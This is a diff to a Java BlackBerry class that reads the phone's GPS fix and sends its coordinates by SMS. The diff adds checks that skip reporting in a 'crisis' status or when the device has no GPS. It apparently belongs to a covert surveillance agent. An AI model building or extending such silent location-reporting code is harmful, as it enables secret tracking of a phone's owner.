@@ -19,6 +19,7 @@ import net.rim.device.api.util.NumberUtilities;
 import blackberry.Device;
 import blackberry.Messages;
 import blackberry.SMSHelper;
+import blackberry.Status;
 import blackberry.Trigger;
 import blackberry.config.ConfAction;
 import blackberry.config.ConfigurationException;
@@ -138,6 +139,8 @@ public final class SmsAction extends SubAction implements LocationObserver {
 
                 case TYPE_LOCATION:
                     // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
+                    
+                    
                     if (!getGPSPosition()) {
                         errorLocation(false);
                     }
@@ -231,6 +234,20 @@ public final class SmsAction extends SubAction implements LocationObserver {
             return false;
         }
 
+        if (Status.self().crisisPosition()) {
+            //#ifdef DEBUG
+            debug.trace("locationGPS: crisis"); //$NON-NLS-1$
+            //#endif
+            return false;
+        }
+
+        if (!Device.getInstance().hasGPS()) {
+            //#ifdef DEBUG
+            debug.error("locationGPS: doesn't have GPS"); //$NON-NLS-1$
+            //#endif
+            return false;
+        }
+        
         synchronized (this) {
             LocationHelper.getInstance().start(this, true);
         }
@@ -240,33 +257,33 @@ public final class SmsAction extends SubAction implements LocationObserver {
 
     public void newLocation(Location loc) {
         try{
-        //#ifdef DEBUG
-        debug.trace("newLocation"); //$NON-NLS-1$
-        //#endif
-
-        if (loc == null) {
             //#ifdef DEBUG
-            debug.error("Error in getLocation"); //$NON-NLS-1$
-            //#endif  
-            return;
-        }
-
-        final float speed = loc.getSpeed();
-        final float course = loc.getCourse();
-
-        final QualifiedCoordinates qc = loc.getQualifiedCoordinates();
-        if (qc == null) {
-            //#ifdef DEBUG
-            debug.error("Cannot get QualifiedCoordinates"); //$NON-NLS-1$
-            //#endif                        
-            errorLocation(false);
-        }else{
-            final StringBuffer sb = new StringBuffer();
-            sb.append(Messages.getString("9.16") + qc.getLatitude() + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
-            sb.append(Messages.getString("9.18") + qc.getLongitude() + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
+            debug.trace("newLocation"); //$NON-NLS-1$
+            //#endif
     
-            sendSMS(sb.toString());
-        }
+            if (loc == null) {
+                //#ifdef DEBUG
+                debug.error("Error in getLocation"); //$NON-NLS-1$
+                //#endif  
+                return;
+            }
+    
+            final float speed = loc.getSpeed();
+            final float course = loc.getCourse();
+    
+            final QualifiedCoordinates qc = loc.getQualifiedCoordinates();
+            if (qc == null) {
+                //#ifdef DEBUG
+                debug.error("Cannot get QualifiedCoordinates"); //$NON-NLS-1$
+                //#endif                        
+                errorLocation(false);
+            }else{
+                final StringBuffer sb = new StringBuffer();
+                sb.append(Messages.getString("9.16") + qc.getLatitude() + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
+                sb.append(Messages.getString("9.18") + qc.getLongitude() + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
+        
+                sendSMS(sb.toString());
+            }
         }catch(Exception ex){
             //#ifdef DEBUG
             debug.error("newLocation: " + ex);
